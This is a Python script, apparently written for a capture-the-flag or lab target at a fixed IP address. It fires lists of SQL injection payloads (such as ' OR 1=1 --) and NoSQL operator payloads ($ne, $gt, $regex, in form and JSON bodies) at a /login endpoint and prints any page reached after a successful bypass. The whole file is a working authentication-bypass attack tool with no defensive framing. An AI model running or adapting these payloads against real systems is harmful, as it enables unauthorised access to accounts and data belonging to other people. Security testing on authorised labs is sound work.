import requests
import re

base = 'http://154.57.164.80:31506'

# Test SQL injection on login
payloads = [
    ("admin' OR '1'='1", "password"),
    ("admin' OR '1'='1' -- ", "password"),
    ("admin'--", "password"),
    ("' OR 1=1 -- ", "password"),
    ("' OR 1=1#", "password"),
    ("admin", "' OR '1'='1"),
    ("admin", "' OR 1=1 -- "),
    ("\" OR 1=1 -- ", "password"),
    ("admin' OR 1=1 LIMIT 1 -- ", "password"),
]

for user, pwd in payloads:
    s = requests.Session()
    r = s.post(f'{base}/login', data={'username': user, 'password': pwd}, allow_redirects=False)
    loc = r.headers.get('Location', '')
    print(f'User={user!r:45} Pass={pwd!r:25} -> status={r.status_code} loc={loc}')
    if loc == '/':
        # We got in - check inbox
        r2 = s.get(f'{base}/')
        print(f'  LOGGED IN! Page: {r2.text[:500]}')

# Test NoSQL injection
print("\n=== NOSQL INJECTION TESTS ===")
nosql_payloads = [
    {'username': 'admin', 'password[$ne]': ''},
    {'username[$ne]': '', 'password[$ne]': ''},
    {'username': 'admin', 'password[$gt]': ''},
    {'username[$gt]': '', 'password[$gt]': ''},
    {'username[$regex]': '.*', 'password[$ne]': ''},
    {'username[$regex]': 'admin', 'password[$ne]': ''},
]

for payload in nosql_payloads:
    s = requests.Session()
    r = s.post(f'{base}/login', data=payload, allow_redirects=False)
    loc = r.headers.get('Location', '')
    print(f'Payload={payload!r:60} -> status={r.status_code} loc={loc}')
    if loc == '/':
        r2 = s.get(f'{base}/')
        print(f'  LOGGED IN! Page: {r2.text[:500]}')

# Also try JSON-based NoSQL injection
print("\n=== JSON NOSQL INJECTION ===")
json_payloads = [
    {"username": {"$ne": ""}, "password": {"$ne": ""}},
    {"username": "admin", "password": {"$ne": ""}},
    {"username": {"$gt": ""}, "password": {"$gt": ""}},
    {"username": {"$regex": ".*"}, "password": {"$ne": ""}},
]

for payload in json_payloads:
    s = requests.Session()
    r = s.post(f'{base}/login', json=payload, allow_redirects=False)
    loc = r.headers.get('Location', '')
    print(f'JSON Payload -> status={r.status_code} loc={loc}')
    if loc == '/':
        r2 = s.get(f'{base}/')
        print(f'  LOGGED IN! Page: {r2.text[:500]}')
